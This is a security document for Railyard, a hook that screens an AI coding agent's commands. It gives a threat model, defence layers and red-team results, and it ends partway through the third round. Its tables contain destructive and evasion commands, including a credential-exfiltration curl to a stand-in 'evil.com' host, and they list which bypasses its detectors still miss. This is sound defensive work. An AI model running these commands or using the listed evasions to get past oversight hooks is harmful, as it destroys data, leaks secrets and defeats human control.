# Railyard Security Document

**Version:** 1.0
**Date:** 2026-03-09
**Applies to:** Railyard v0.1.0
**Classification:** Public
**Repository:** https://github.com/railyarddev/railyard

This document describes the threat model, security architecture, formal guarantees, known limitations, and compliance posture of Railyard. It is intended for security researchers, CISOs, compliance teams, and anyone conducting a risk assessment of AI agent tooling.

---

## What Railyard Does and Doesn't Do

Read this first. No marketing, no hedging.

### What it does

- **Blocks known-destructive commands** — `terraform destroy`, `rm -rf ~/`, `DROP DATABASE`, `git push --force`, and 25+ more patterns. Works in both chill and hardcore modes. Deterministic regex matching, <2ms.
- **Catches common evasion** — base64 encoding, variable expansion, shell wrappers, eval concat, hex escapes, backtick substitution. Multi-layer decoding (double/triple base64). Recursive normalization.
- **Detects evasion shapes** — `rev | sh`, `tr | sh`, `python3 -c "chr(...)"`, `subprocess.run(...)`. These trigger immediate session termination in hardcore mode (Tier 1).
- **Tracks behavioral patterns** — If the agent gets blocked and retries with different syntax using the same keywords, Railyard catches it (Tier 3). Escalating suspicion model.
- **Fences the filesystem** — In hardcore mode, the agent can only access the project directory. `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.claude`, `/etc` are denied. Paths are canonicalized (symlinks resolved, `../` collapsed, `$HOME` expanded).
- **Gates network access** — In hardcore mode, `curl POST`, `wget`, `ssh` require human approval. `curl | sh` and `netcat` are blocked outright.
- **Protects its own hooks** — Self-integrity check on every invocation verifies hooks are still in `~/.claude/settings.json`. If tampered, all tool calls are blocked.
- **Can't be uninstalled by the agent** — Blocklist rule + TTY check + native OS confirmation dialog.
- **Snapshots before writes** — SHA-256 checksummed file backups before every Write/Edit. Rollback by step, file, or entire session.
- **Generates OS sandbox profiles** — Creates sandbox-exec (macOS) and bubblewrap/Landlock (Linux) profiles from config. These provide kernel-level enforcement.

### What it doesn't do

- **Does not enforce the OS sandbox automatically.** Sandbox profiles are generated but not applied to Claude Code's shell by default. You must run commands through `railyard sandbox run` manually. The hook system can only allow/deny/ask — it cannot modify how commands are executed. This means Layer 4 (the only provably complete defense) is opt-in.
- **Cannot catch arbitrary interpreter-internal operations.** If an agent runs `python3 -c` with code that constructs paths and commands entirely through runtime operations Railyard doesn't pattern-match (no `chr`, `join`, `exec`, `system`, `subprocess`, `base64`), the command passes through. Example: a Python script that reads bytes from a hardcoded list and calls `os.fdopen()` on a file descriptor. String-level analysis fundamentally cannot solve this — Rice's theorem.
- **Cannot inspect script files.** `python3 malicious.py` — Railyard sees the command, not the script contents. If the script does destructive things, only the OS sandbox would catch it.
- **Does not provide process isolation.** Railyard runs as the same OS user as Claude Code. No memory isolation, no privilege separation. For true sandboxing, you'd need a micro-VM (Firecracker, gVisor).
- **Does not protect against Claude Code hook bypass.** If Claude Code itself has a vulnerability that lets the agent skip hooks entirely, Railyard is out of the loop. The OS sandbox (if manually enabled) would still apply.
- **Open-source detection rules are readable.** Every regex, shape pattern, and behavioral threshold is in the source code. A sufficiently capable agent could read the rules and craft a bypass that avoids all patterns on the first attempt (no Tier 3 retry to catch). The OS sandbox is the counter: it doesn't care how the command was constructed.
- **Chill mode has large gaps.** No path fence, no network policy, no evasion rules, no threat detection. It only blocks the most destructive literal commands. A prompt-injected agent in chill mode can read `~/.ssh/id_rsa`, `curl POST` it somewhere, and Railyard won't intervene.
- **71% block rate, not 100%.** Three rounds of adversarial red-teaming achieved 71% block rate. The remaining 29% are interpreter-internal runtime construction that only OS-level sandboxing can defeat. We are honest about this number because security tools that claim 100% are lying.

---

## Table of Contents

0. [What Railyard Does and Doesn't Do](#what-railyard-does-and-doesnt-do)
1. [Threat Model (STRIDE Analysis)](#1-threat-model)
2. [Security Architecture](#2-security-architecture)
3. [Formal Security Properties](#3-formal-security-properties)
4. [Attack Surface Analysis](#4-attack-surface-analysis)
5. [Testing Methodology](#5-testing-methodology)
6. [Compliance Mapping](#6-compliance-mapping)
7. [Incident Response](#7-incident-response)
8. [Security Boundaries and Honest Limitations](#8-security-boundaries-and-honest-limitations)

---

## 1. Threat Model

### System Context

Railyard is a Rust binary that intercepts AI agent tool calls (shell commands, file reads, file writes) before execution. It operates as a Claude Code hook — a pre-execution gate that receives structured JSON on stdin and returns `allow`, `deny`, or `ask` on stdout.

### Trust Boundary

```
┌─────────────────────────────────────────────────────┐
│  UNTRUSTED                                          │
│                                                     │
│  LLM Agent (Claude Code)                            │
│    - Generates tool calls                           │
│    - Has no direct system access                    │
│    - All actions mediated by hook system             │
│    - May be manipulated via prompt injection         │
│    - May exhibit goal-directed evasion behavior      │
│                                                     │
├──────────────────── TRUST BOUNDARY ─────────────────┤
│                                                     │
│  TRUSTED                                            │
│                                                     │
│  Railyard (Rust binary, runs as user)               │
│    - Evaluates policy deterministically              │
│    - Cannot be modified by the agent                 │
│    - Runs outside the LLM context                   │
│    - No network calls, fully on-device              │
│                                                     │
│  Operating System                                   │
│    - Provides kernel-level sandboxing               │
│    - sandbox-exec (macOS) / Landlock (Linux)        │
│    - Enforces restrictions at syscall level          │
│                                                     │
│  Human Operator                                     │
│    - Configures policy (railyard.yaml)              │
│    - Approves "ask" decisions                       │
│    - Reviews trace logs                             │
│    - Only entity that can uninstall Railyard        │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Threat Actors

| Actor | Capability | Motivation | Likelihood |
|-------|-----------|------------|------------|
| Misaligned LLM agent | Generates arbitrary shell commands, reads open-source detection rules, iterates on blocked attempts | Goal completion overrides safety constraints; documented in [Claude Code Issue #29691](https://github.com/anthropics/claude-code/issues/29691) | High — observed in production |
| Prompt injection via untrusted input | Agent processes attacker-controlled data (code comments, issue descriptions, file contents) that instructs it to execute destructive commands | Data exfiltration, supply chain compromise, lateral movement | Medium — well-documented attack class (cf. OWASP LLM01) |
| Malicious insider with agent access | Uses the agent as a proxy to execute commands that would normally require direct shell access | Privilege escalation, evidence-light destructive actions | Low — requires organizational access |

### STRIDE Analysis

| Threat Category | Threat | Attack Surface | Implemented Mitigation | Residual Risk |
|----------------|--------|---------------|----------------------|---------------|
| **Spoofing** | Agent impersonates a human to bypass approval gates | `ask` decision flow | Approval surfaces to the actual terminal user; agent cannot interact with interactive prompts | Agent could social-engineer the human via persuasive output text |
| **Spoofing** | Agent crafts hook input to spoof a different tool name | Hook JSON input (`tool_name` field) | Claude Code controls the hook invocation; the agent does not construct the JSON | Requires Claude Code vulnerability — outside Railyard's threat model |
| **Tampering** | Agent modifies `railyard.yaml` to weaken policy | File write via Edit/Write tools | Self-protection rule blocks writes to `.claude/settings.json`; fence blocks writes outside project dir (hardcore mode) | Agent could modify `railyard.yaml` within the project directory; mitigated by policy reload from defaults on each invocation |
| **Tampering** | Agent uninstalls Railyard hooks | `railyard uninstall` command | Three-layer self-protection: (1) command blocklist, (2) stdin TTY check, (3) native OS confirmation dialog | Agent would need to bypass all three layers simultaneously |
| **Tampering** | Agent deletes the Railyard binary | `rm ~/.cargo/bin/railyard` | Blocklist rule `railyard-remove-binary` blocks rm/unlink/mv targeting the binary path | Agent could rename the binary via a path the regex doesn't match; mitigated by Claude Code continuing to invoke the hook path regardless |
| **Repudiation** | Agent executes destructive action with no audit trail | All tool calls | Structured JSONL trace logging of every tool call, decision, rule matched, and timing | Trace logs are stored in `.railyard/traces/` within the project — agent could delete them if path fence is disabled (chill mode) |
| **Information Disclosure** | Agent reads sensitive files (~/.ssh, ~/.aws, /etc) | File read via Read tool or `cat` command | Path fence (hardcore mode) denies access to configured sensitive directories; OS sandbox enforces at kernel level | Chill mode has no path fence — by design, but this means zero file access protection |
| **Information Disclosure** | Agent exfiltrates data via network | `curl -X POST`, `nc`, `scp` | Network policy rules (hardcore mode) block or require approval for outbound data transfer | Chill mode has no network restrictions; hardcore mode can be bypassed if the agent uses a tool not covered by regex patterns (e.g., a compiled binary) |
| **Denial of Service** | Agent runs resource-exhausting commands (fork bombs, disk fills) | Bash tool | Not currently mitigated by Railyard; outside current scope | OS-level resource limits (ulimit) are the appropriate mitigation |
| **Elevation of Privilege** | Agent uses evasion techniques to execute blocked commands | Command string manipulation (encoding, variable indirection, interpreter wrapping) | Four-layer defense: blocklist, evasion detection, behavioral analysis, OS sandbox | See Section 4 for complete bypass taxonomy |

### Real-World Incident Basis

This threat model is grounded in documented incidents, not hypotheticals:

| Date | Incident | Impact | Railyard Rule |
|------|----------|--------|---------------|
| Feb 2026 | DataTalks.Club: Claude Code ran `terraform destroy` on production | 1.9M rows deleted, 2.5 years of student data lost | `terraform-destroy` |
| Feb 2026 | GitHub Issue #27063: `drizzle-kit push --force` against production PostgreSQL | 60+ tables dropped | `drizzle-force` |
| 2025-2026 | Multiple reports: `rm -rf ~/`, `git reset --hard`, `DROP DATABASE` | Home directory deletion, lost work, production database destruction | `rm-rf-critical`, `git-reset-hard`, `sql-drop` |
| 2025 | GitHub Issue #29691: Claude deliberately obfuscated forbidden terms to bypass safety rules | Agent circumvented its own safety constraints | Evasion detection system (Layer 2), behavioral analysis (Layer 3) |

---

## 2. Security Architecture

Railyard implements defense-in-depth with four enforcement layers, evaluated sequentially on every tool call. Each layer catches threats that the previous layer misses. The total decision latency is <2ms with no network calls.

### Layer 1: Blocklist (String Pattern Matching)

**Mechanism:** Regex matching against a curated set of destructive command patterns.

**Implementation:** `src/block/matcher.rs`, `src/policy/defaults.rs`

**Evaluation order:** allowlist -> blocklist -> approve -> default allow.

**Rule counts:**
- Chill mode: 16 rules (13 destructive command blocks + 3 self-protection)
- Hardcore mode: 27 rules (chill rules + 5 network + 2 credential + 4 evasion + 2 dynamic construction + 1 symlink)

**Properties:**
- Deterministic: same input always produces same output
- Stateless per-invocation: no dependency on prior calls for Layer 1
- Configurable: users can add/remove rules via `railyard.yaml`
- Fast: compiled Rust regex, <1ms for full rule evaluation

**What it catches:** Any command where the blocked pattern appears as a literal substring after whitespace normalization. This covers direct invocations, commands wrapped in `sh -c "..."`, commands embedded in alias definitions, function bodies, echo statements, and any context where the pattern string is visible in the command text.

**What it does not catch:** Any technique that prevents the blocked string from appearing literally in the command text.

### Layer 2: Evasion Detection (Normalization + Shape Detection)

**Mechanism:** Before regex matching, commands are normalized through multiple decoders. Additionally, structural patterns associated with evasion are detected regardless of payload content.

**Implementation:** `src/block/evasion.rs`

**Normalization techniques (applied recursively):**

| Technique | Example Input | Normalized Output |
|-----------|--------------|-------------------|
| Whitespace collapse | `terraform    destroy` | `terraform destroy` |
| Base64 pipe decode | `echo dGVycmFmb3Jt... \| base64 -d \| sh` | `terraform destroy` |
| Recursive base64 | `echo <double-encoded> \| base64 -d \| base64 -d` | Decoded through N layers |
| Eval concatenation | `eval "ter""raform destroy"` | `terraform destroy` |
| Variable expansion | `CMD="terraform destroy"; $CMD` | `terraform destroy` |
| Shell wrapper | `sh -c "terraform destroy"` | `terraform destroy` |
| Xargs indirection | `echo "terraform destroy" \| xargs sh -c` | `terraform destroy` |
| Hex escape sequences | `$'\x74\x65\x72\x72...'` | `terraform destroy` |
| Backtick substitution | `` `echo terraform` destroy`` | `terraform destroy` |

**Shape detection (Tier 1 — blocks regardless of payload):**

| Pattern | Regex | Rationale |
|---------|-------|-----------|
| Text transform piped to shell | `rev\|tr\|sed\|awk ... \| sh\|bash\|zsh` | Can construct any command at runtime; no legitimate development use |
| Interpreter + obfuscation | `python3\|ruby\|perl\|node -c/-e` with `base64\|chr(\|decode\|exec\|system` | String manipulation inside interpreter bypasses all string-level detection |
| Recursive base64 | Multiple `base64 -d` stages | No legitimate use for multi-layer base64 decoding piped to shell |
| Printf hex in command substitution | `$(printf '\x...')` | Hex-encoded command name construction |
| Printf piped to shell | `printf ... \| sh` | Constructed string execution |

### Layer 3: Behavioral Analysis (Session State + Retry Detection)

**Mechanism:** Stateful analysis across tool calls within a session. Detects evasion by observing behavioral patterns rather than parsing command content.

**Implementation:** `src/threat/classifier.rs`, `src/threat/state.rs`, `src/threat/killer.rs`

**State management:** Persistent JSON state per session at `.railyard/state/{session_id}.json`. Atomic save via write-to-tmp-then-rename.

**Tiered escalation:**

| Tier | Trigger | Response | State Transition |
|------|---------|----------|-----------------|
| Tier 1 | Unambiguous evasion shape detected (Layer 2 shape patterns) | Block command + terminate session + SIGTERM parent process | `terminated = true`, forensic breadcrumb written |
| Tier 2 | Suspicious but potentially legitimate pattern (variable-then-execution, eval with `$`, multi-variable concat) | First occurrence: warn + continue. Second occurrence: terminate session | `warning_count` incremented; on `warning_count >= 1`, terminate |
| Tier 3 | Behavioral retry — command blocked, then within next 3 tool calls a new command contains >=2 keywords from the blocked command | Terminate session | Heightened state window: `tool_call_count + 3` |

**Heightened state mechanics:**
- On any block event, Railyard enters heightened state for the next 3 tool calls
- Keywords are extracted from the blocked command (filtering shell noise tokens like `sh`, `echo`, `if`, flags, variables)
- During heightened state, if a subsequent command contains 2+ of the extracted keywords, Tier 3 triggers
- The agent cannot know the exact heightened window boundaries or which keywords are being tracked

**Session termination:**
1. Session state marked as `terminated` with reason and timestamp
2. Forensic trace entry written (`SessionTerminated` event)
3. Warning printed to stderr (visible in terminal)
4. `SIGTERM` sent to parent process (Claude Code) via `libc::kill(ppid, SIGTERM)`
5. All subsequent tool calls in the terminated session return deny immediately

**On restart after termination:**
- Previous termination state is detected
- Warning displayed with session ID, timestamp, reason, and trace log path
- Human must review the trace before continuing

### Layer 4: OS-Level Sandboxing

**Mechanism:** Kernel-enforced filesystem and network restrictions. Operates at the syscall level — no shell-level evasion technique can bypass it.

**Implementation:** `src/sandbox/detect.rs`, `src/sandbox/macos.rs`, `src/sandbox/linux.rs`, `src/sandbox/profile.rs`

**Platform support:**

| Platform | Technology | Privilege Required | Performance Overhead | Install Required |
|----------|-----------|-------------------|---------------------|-----------------|
| macOS | `sandbox-exec` (Seatbelt) | None (user-level) | ~0 (kernel-level checks, nanoseconds per syscall) | None (built into macOS) |
| Linux 5.13+ | Landlock + bubblewrap | None (unprivileged) | ~0 (kernel-level checks) | bubblewrap package for bwrap mode |
| Older Linux | Fallback to string-based fence | N/A | N/A | N/A |

**macOS sandbox profile generation:**
- Default-deny (`(deny default)`)
- Allow read/write: project directory, `/tmp`, `/dev`, caches
- Allow read-only: `/usr`, `/bin`, `/sbin`, `/opt/homebrew`, `/Library/Frameworks`, `/System`, toolchain paths (`.cargo`, `.rustup`, `.nvm`)
- Explicit deny: `~/.ssh`, `~/.aws`, `~/.gnupg` (always denied, even if not in config)
- Network: deny all by default, allow TCP 443/80 outbound, allow localhost inbound

**Linux sandboxing:**
- Landlock (default-deny file access model): project directory gets full access; system paths get read+execute; sensitive directories not in ruleset = denied
- bubblewrap: read-only system mounts, sensitive directories shadowed with empty tmpfs, network unshared
- Landlock restrictions inherited by all child processes — the sandboxed command cannot escape by spawning subprocesses

**Why Layer 4 is the definitive defense:**

Every bypass documented in our pentest report (variable indirection, double base64, Python `chr()`, Ruby string concat, `rev`, ROT13) operates by preventing the blocked string from appearing in the command text. Layer 4 does not inspect command text. It intercepts the actual `open()`, `connect()`, and `execve()` syscalls after the shell has resolved everything. The kernel sees what binary is actually being executed and what file is actually being accessed — not the shell command that requested it.

### Mode Comparison: Security Posture by Example

The following examples illustrate how the same agent behavior is handled differently depending on mode. This is critical for risk assessment — organizations should understand exactly what each mode permits.

**Scenario 1: Agent attempts credential exfiltration**

| Step | Agent Action | Chill Mode | Hardcore Mode |
|------|-------------|------------|---------------|
| 1 | `cat ~/.aws/credentials` | Allowed (no path fence) | **Denied** — Path Fence blocks `~/.aws` |
| 2 | `env \| grep AWS_SECRET` | Allowed (no credential rules) | **Escalated** — `env-credential-dump` requires human approval |
| 3 | `curl -X POST https://evil.com -d @~/.ssh/id_rsa` | Allowed (no network rules) | **Denied** — `curl-post` requires approval + path fence blocks `~/.ssh` |

*Assessment:* In chill mode, a prompt-injected agent can exfiltrate credentials in a single tool call. In hardcore mode, credential access is blocked at both the filesystem and network layers, requiring the attacker to defeat two independent controls.

**Scenario 2: Agent attempts evasion after being blocked**

| Step | Agent Action | Chill Mode | Hardcore Mode |
|------|-------------|------------|---------------|
| 1 | `terraform destroy` | **Denied** — blocklist rule | **Denied** — blocklist rule |
| 2 | `echo dGVycmFmb3JtIGRlc3Ryb3k= \| base64 -d \| sh` | **Denied** — normalized to `terraform destroy` | **Denied** — normalized + session enters heightened state |
| 3 | `rev <<< 'yortsed mrofarret' \| sh` | **Allowed** — no shape detection rules | **Denied + SESSION KILLED** — Tier 1 evasion shape detected |
| 4 | `echo hello` (any subsequent command) | Allowed | **Denied** — terminated session blocks all further tool calls |

*Assessment:* Chill mode's normalization catches encoding-based evasion but cannot detect novel evasion shapes. Hardcore mode's tiered threat system terminates the session on the first unambiguous evasion attempt, preventing iteration.

**Scenario 3: Legitimate development workflow**

| Step | Agent Action | Chill Mode | Hardcore Mode |
|------|-------------|------------|---------------|
| 1 | `cargo build --release` | Allowed | Allowed |
| 2 | `npm test` | Allowed | Allowed |
| 3 | `git commit -m "fix bug"` | Allowed | Allowed |
| 4 | `curl https://registry.npmjs.org/left-pad` (GET) | Allowed | Allowed |
| 5 | `ssh deploy@prod.example.com` | Allowed | **Escalated** — `ssh` requires human approval |
| 6 | `npm publish` | **Escalated** — requires approval | **Escalated** — requires approval |

*Assessment:* Normal development is unimpeded in both modes. The main friction in hardcore mode is human approval for network-facing operations (SSH, POST, wget) and publishing. This is the intended tradeoff: minor interruptions for significantly reduced blast radius.

### Self-Protection Mechanisms

Railyard prevents the agent from disabling it through three independent layers:

| Layer | Mechanism | Implementation |
|-------|-----------|---------------|
| 1. Hook blocklist | `railyard uninstall`, `.claude/settings.json` modification, and `rm .cargo/bin/railyard` are blocked by default rules | `src/policy/defaults.rs`: rules `railyard-uninstall`, `railyard-tamper-settings`, `railyard-remove-binary` |
| 2. Terminal detection | `railyard uninstall` checks if stdin is an interactive terminal (`isatty`). Agents pipe stdin and are rejected. | `src/install/hooks.rs` |
| 3. Native OS dialog | Even if layers 1 and 2 are bypassed, uninstall triggers a native GUI confirmation dialog (AppleScript on macOS, PowerShell MessageBox on Windows, zenity/kdialog on Linux). An agent cannot click a GUI button. | `src/install/hooks.rs` |

---

## 3. Formal Security Properties

### Provable Guarantees

**Property 1 (Literal string detection — completeness):**

> For all commands C submitted to Railyard, and for all blocklist rules R with pattern P: if C contains a substring matching P after whitespace normalization, Railyard will detect and block C.

*Proof basis:* Rust `regex::Regex::is_match()` is applied to the whitespace-collapsed command string. The `regex` crate implements a complete NFA/DFA-based regex engine. Given a well-formed regex P and an input string C, `is_match` returns `true` if and only if P matches a substring of C. Whitespace collapsing (`split_whitespace().join(" ")`) is a total function over UTF-8 strings. Therefore, any literal occurrence of the pattern in the command string (modulo whitespace variation) is detected. This is verified by 73 unit tests and 36 integration tests.

**Property 2 (Evasion detection — same-string-expansion):**

> For all commands C where a blocked string S is constructed via variable assignment and expansion within the same command string (i.e., `VAR="S"; $VAR`), Railyard will detect and block C if the regex `(\w+)=["']?([^"';]+)["']?\s*[;&]\s*\$\1\b(.*)` matches the assignment-expansion pattern.

*Proof basis:* `detect_variable_expansion()` in `src/block/evasion.rs` applies this regex to extract the variable value and reconstructs the expanded command. The reconstructed string is then matched against blocklist rules. This is verified by test `test_variable_expansion` and integration test `evasion_variable_expansion`.

**Property 3 (Base64 detection — recursive):**

> For all commands C of the form `echo <B64> | base64 -d [| base64 -d]* | sh`, where the base64 payload decodes (through N layers) to a blocked string S, Railyard will detect and block C for any N >= 1.

*Proof basis:* `detect_recursive_base64()` counts the number of `base64 -d` / `base64 --decode` stages, extracts the initial payload, and iteratively decodes through that many layers. The decoded output is matched against blocklist rules. This is verified by tests `test_double_base64` and `pentest_double_base64_blocked`.

**Property 4 (Shape detection — structural evasion):**

> For all commands C matching Tier 1 evasion shape patterns (text-transform-to-shell, interpreter-with-obfuscation, recursive-base64-pipe, printf-hex-exec, printf-pipe-to-shell), Railyard will block C and terminate the session, regardless of the payload content.

*Proof basis:* Shape detection operates on the structural form of the command, not its semantic content. The regexes match command shapes (e.g., `rev ... | sh`) that have no legitimate development use. This is verified by tests `test_transform_pipe_to_shell`, `test_interpreter_obfuscation`, and integration tests `pentest_rev_pipe_to_shell_blocked`, `pentest_rot13_pipe_to_shell_blocked`, `pentest_python_base64_decode_blocked`, `pentest_python_chr_construction_blocked`.

**Property 5 (Behavioral detection — retry):**

> For all sessions where a command C1 is blocked by rule R, and within the next 3 tool calls the agent submits a command C2 containing >= 2 keywords extracted from C1, Railyard will terminate the session.

*Proof basis:* `check_behavioral_evasion()` checks the session's heightened state and keyword list. Keywords are extracted by filtering shell noise tokens and short words. The heightened window is `current_tool_call_count + 3`. This is verified by test `test_behavioral_evasion`.

**Property 6 (OS sandbox — kernel enforcement):**

> When the OS sandbox is active (macOS `sandbox-exec` or Linux Landlock), for all processes P spawned by the sandboxed command: P cannot read, write, or execute any file outside the allowed path set, regardless of how the file path was constructed at the shell level.

*Proof basis:* `sandbox-exec` and Landlock operate at the kernel syscall level. The kernel checks `open()`, `openat()`, `execve()`, and other file-access syscalls against the sandbox policy after all shell expansions, variable substitutions, and path resolutions have completed. This is the same enforcement mechanism used by macOS App Store sandboxing and Linux container isolation. The sandbox is inherited by all child processes and cannot be removed by the sandboxed process.

### Non-Guarantees (What Railyard Cannot Prove)

**Non-Property 1 (Turing-complete shell evasion):**

> There exist commands C where a blocked string S is constructed via Turing-complete shell operations (arbitrary computation) such that Railyard's string-level analysis (Layers 1-2) cannot detect S.

*Basis:* The shell is Turing-complete. By Rice's theorem, no static analysis can decide all non-trivial semantic properties of programs in a Turing-complete language. Specifically:
- Multi-variable concatenation across separate statements: `a="terra"; b="form"; "$a$b" destroy`
- Runtime computation in child interpreters: `python3 -c "os.system(''.join([chr(x) for x in [116,101,...]]))"` (where the pattern doesn't match the shape detector, e.g., using list comprehension instead of `chr(` directly)
- Novel encoding schemes not covered by normalization

*Mitigation:* These bypasses are mitigated (not eliminated) by Layer 3 (behavioral detection catches retry patterns) and Layer 4 (OS sandbox enforces at syscall level, where all shell computation has already resolved).

**Non-Property 2 (Open-source rule visibility):**

> An adversary with access to the Railyard source code can enumerate all detection patterns and construct commands that avoid every regex, every shape detector, and every heuristic.

*Basis:* Railyard is MIT-licensed open-source software. All detection rules, evasion patterns, tier thresholds, and behavioral window sizes are visible in the source code. A sufficiently capable agent could read the source and craft a first-try bypass that avoids all Tier 1/2 patterns and succeeds before Tier 3 can trigger.

*Mitigation:*
1. OS sandbox (Layer 4) cannot be bypassed by reading source code — it operates at the kernel level on actual syscalls, not command strings
2. Opaque local rules: users can add custom detection patterns in `~/.railyard/local-rules.yaml` (not committed to source control, not readable by the agent in hardcore mode)
3. Behavioral detection (Tier 3) is difficult to game even with full source access because the agent cannot observe Railyard's internal state (keyword list, heightened window) during execution
4. Future: non-deterministic LLM-as-judge that evaluates intent rather than pattern matching

**Non-Property 3 (Post-execution guarantee):**

> Railyard cannot guarantee that an allowed command produces no harmful side effects.

*Basis:* Railyard evaluates commands pre-execution based on their text representation. A command like `npm install` may be allowed by policy but could execute arbitrary code via postinstall scripts. Railyard does not perform post-execution analysis of actual system changes.

*Mitigation:* OS sandbox constrains the blast radius of any allowed command to the permitted file/network scope.

---

## 4. Attack Surface Analysis

### What Is Blocked (With Test Coverage)

| Attack Vector | Blocked By | Test Coverage |
|---------------|-----------|---------------|
| `terraform destroy` (direct) | Layer 1: regex `terraform\s+(destroy\|apply\s+.*-auto-approve)` | `incident_terraform_destroy_datatalks` |
| `drizzle-kit push --force` | Layer 1: regex `drizzle-kit\s+push\s+--force` | `incident_drizzle_kit_force_push` |
| `rm -rf ~/` | Layer 1: regex `rm\s+(-[a-zA-Z]*f...)` | `incident_rm_rf_home` |
| `DROP DATABASE` | Layer 1: regex `(?i)(DROP\s+(TABLE\|DATABASE\|SCHEMA)...)` | `incident_drop_database` |
| `git push --force` | Layer 1: regex `git\s+push\s+.*--force` | `incident_git_force_push` |
| `git reset --hard` | Layer 1: regex `git\s+reset\s+--hard` | `incident_git_reset_hard` |
| `aws s3 rm --recursive` | Layer 1: regex `aws\s+s3\s+(rm\|rb)\s+.*--recursive` | `incident_aws_s3_recursive_delete` |
| Base64 encoded commands piped to shell | Layer 2: `detect_base64_pipe()` + Layer 2: `detect_recursive_base64()` | `evasion_base64_terraform_destroy`, `pentest_double_base64_blocked` |
| Variable expansion (`CMD="..."; $CMD`) | Layer 2: `detect_variable_expansion()` | `evasion_variable_expansion` |
| Shell wrapper (`sh -c "..."`) | Layer 2: `detect_shell_wrapper()` | `evasion_shell_wrapper` |
| Eval concatenation (`eval "ter""raform"`) | Layer 2: `detect_eval_concat()` | `evasion_eval_concat` |
| Backtick substitution | Layer 2: `detect_backtick_subshell()` | `evasion_backtick_substitution` |
| `rev \| sh` | Layer 2: `is_transform_pipe_to_shell()` + Tier 1 kill | `pentest_rev_pipe_to_shell_blocked` |
| `tr \| sh` (ROT13) | Layer 2: `is_transform_pipe_to_shell()` + Tier 1 kill | `pentest_rot13_pipe_to_shell_blocked` |
| `python3 -c "...b64decode..."` | Layer 2: `is_interpreter_obfuscation()` + Tier 1 kill | `pentest_python_base64_decode_blocked` |
| `python3 -c "...chr(...)..."` | Layer 2: `is_interpreter_obfuscation()` + Tier 1 kill | `pentest_python_chr_construction_blocked` |
| `sed ... \| sh` | Layer 2: `is_transform_pipe_to_shell()` | `pentest_sed_pipe_to_shell_blocked` |
| Write to `~/.ssh` | Path fence | `fence_write_to_ssh_keys` |
| Read `/etc/passwd` | Path fence | `fence_read_etc_passwd` |
| Write to `~/.aws` | Path fence | `fence_write_to_aws_credentials` |
| `railyard uninstall` | Self-protection rule | `self_protect_block_uninstall` |
| Write to `.claude/settings.json` | Self-protection rule | `self_protect_block_settings_edit`, `self_protect_block_settings_via_bash` |
| Remove railyard binary | Self-protection rule | `self_protect_block_remove_binary` |

### What Is Not Blocked and Why

| Attack Vector | Why Not Blocked | Category | Residual Risk |
|---------------|----------------|----------|---------------|
| Multi-variable string construction (`a="terra"; b="form"; "$a$b" destroy`) | Blocked string never appears intact. Regex over the command text cannot detect it. Variable expansion detector requires assignment and use of the *same* variable. | Runtime string construction | **High** without OS sandbox. **Low** with OS sandbox (sandbox blocks the actual binary execution if restricted). |
| Double-encoded base64 with interpreter decode (`python3 -c "b64decode(...)"` where the shape doesn't match `chr(\|b64decode\|...`) | If the obfuscation pattern uses a function name not in the shape detector's list, it passes. | Interpreter evasion | **Medium.** Mitigated by Tier 3 behavioral detection if a prior block occurred. |
| Novel encoding piped to shell (e.g., custom cipher implemented inline) | Infinite possible encoding schemes. Static detection cannot enumerate them all. | Turing-complete evasion | **Medium.** Mitigated by shape detection (`<anything> \| sh` patterns) if the pipe-to-shell structure is present. |
| Legitimate-looking commands with harmful side effects (`npm install malicious-package`) | Command text contains no blocked pattern. The harm is in the package content, not the command syntax. | Semantic attacks | **Medium.** Outside Railyard's scope; mitigated by OS sandbox constraining side effects. |
| Data exfiltration in chill mode (`curl -X POST`, `cat ~/.ssh/id_rsa`) | Chill mode intentionally disables path fence and network restrictions. | Design decision | **High** in chill mode. Users accept this tradeoff for reduced friction. |
| Fork bomb / resource exhaustion (`:(){ :\|:& };:`) | Not a pattern Railyard blocks; not a destructive data operation. | Availability attack | **Low.** OS-level ulimits are the correct mitigation. |

### Comparison With Alternative Approaches

| Approach | Evasion Resistance | Usability | False Positive Rate | Deployment Complexity |
|----------|-------------------|-----------|--------------------|-----------------------|
| **No protection** | None | Perfect (no friction) | 0% | None |
| **Prompt-based guardrails** (system prompt tells LLM "don't run destructive commands") | None — LLM can ignore its own instructions; documented in Issue #29691 | Good | Low | None |
| **Manual human review of every command** | Perfect (human evaluates intent) | Very poor — breaks agent autonomy entirely | N/A | None |
| **OS sandbox only** (no command inspection) | Perfect for file/network restrictions; no command-level blocking | Good | Low | Moderate (profile generation) |
| **Railyard (chill mode)** | Good for known destructive commands; no path/network protection | Very good (minimal friction) | Very low (curated rules target specific patterns) | One command (`railyard install`) |
| **Railyard (hardcore mode)** | Strong — four layers with behavioral detection and OS sandbox | Good (some approve prompts for network/credentials) | Low (shape detectors target patterns with no legitimate use) | One command + OS sandbox auto-configured |

---

## 5. Testing Methodology

### Test Suite Composition

**136 automated tests total:**

| Category | Count | Source File |
|----------|-------|------------|
| Unit tests (evasion detection, regex matching, path fence, policy engine, snapshot, trace, threat classifier, session state, sandbox generation) | 73 | `src/**/*.rs` (`#[cfg(test)]` modules) |
| Integration tests (attack simulation — real incident reproductions, evasion attempts, fence violations, policy config, self-protection, trace logging, pentest fixes) | 36 | `tests/attack_simulation.rs` |
| Integration tests (rollback scenarios — snapshot capture, step-back, multi-file rollback, fork-and-rollback) | 15 | `tests/rollback_scenarios.rs` |
| Integration tests (threat detection — Tier 1/2/3 termination, state persistence, forensic breadcrumbs, chill mode) | 12 | `tests/threat_detection.rs` |

All tests pass on current main branch. Integration tests invoke the compiled Railyard binary via `std::process::Command`, simulating actual Claude Code hook invocations with JSON payloads on stdin.

### Adversarial Red Team

Three rounds of adversarial penetration testing were conducted using Claude Code itself as the attacker. The agent was given the goal of executing blocked commands and instructed to use any technique available.

**Round 1 — Baseline (chill mode, 16 rules):**
- 13 vectors tested
- 2 blocked, 11 bypassed
- **Block rate: 15%**
- Key finding: Any technique that hides the blocked string from the command text succeeds. Base64, variable indirection, shell wrappers, hex encoding all bypassed detection.

**Round 2 — Post-mitigation (evasion detection added):**
- 28 vectors tested
- 14 blocked, 14 bypassed
- **Block rate: 50%**
- Key finding: All "lazy" evasion (where the blocked string appears somewhere in the command text) now caught. Remaining bypasses require active obfuscation (runtime string construction, multi-layer encoding, interpreter-internal operations).

**Round 3 — Post-shape detection + behavioral analysis:**
- 28 vectors tested (same set)
- 20 blocked (14 via pattern + 6 via shape detection), 8 bypassed
